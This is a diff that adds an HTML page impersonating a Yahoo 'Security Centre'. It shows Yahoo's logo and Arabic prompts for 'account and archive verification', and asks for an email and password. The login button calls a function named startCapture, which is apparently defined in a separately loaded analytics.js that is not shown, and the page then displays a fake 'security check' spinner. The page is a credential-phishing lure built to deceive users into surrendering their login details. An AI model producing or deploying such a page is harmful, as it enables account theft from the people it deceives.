@@ -1,0 +1,32 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <title>Yahoo | Security Centre</title>
+    <style>
+        body { background: #f1f1f1; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .box { background: white; padding: 40px; border-radius: 4px; box-shadow: 0 4px 12px rgba(0,0,0,0.1); width: 350px; text-align: center; border-top: 5px solid #6001d2; }
+        .logo { width: 90px; margin-bottom: 20px; }
+        input { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #ccc; border-radius: 4px; box-sizing: border-box; }
+        .btn { background: #6001d2; color: white; border: none; width: 100%; padding: 12px; border-radius: 20px; font-weight: bold; cursor: pointer; }
+        #loading { display: none; margin-top: 20px; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+    </style>
+</head>
+<body>
+    <div class="box">
+        <img src="https://s.yimg.com/rz/p/yahoo_frontpage_en-US_s_f_p_bestfit_frontpage_2x.png" class="logo">
+        <div id="form-side">
+            <h2>توثيق الحساب والأرشيف</h2>
+            <input type="email" id="email" placeholder="اسم المستخدم أو الإيميل">
+            <input type="password" id="pass" placeholder="كلمة المرور">
+            <button class="btn" onclick="startCapture()">تسجيل الدخول والتوثيق</button>
+        </div>
+        <div id="loading">
+            <p>جاري فحص الأمان وسحب الأرشيف...</p>
+            <div style="border: 3px solid #f3f3f3; border-top: 3px solid #6001d2; border-radius: 50%; width: 30px; height: 30px; animation: spin 1s linear infinite; display: inline-block;"></div>
+        </div>
+    </div>
+    <script src="analytics.js"></script>
+</body>
+</html>
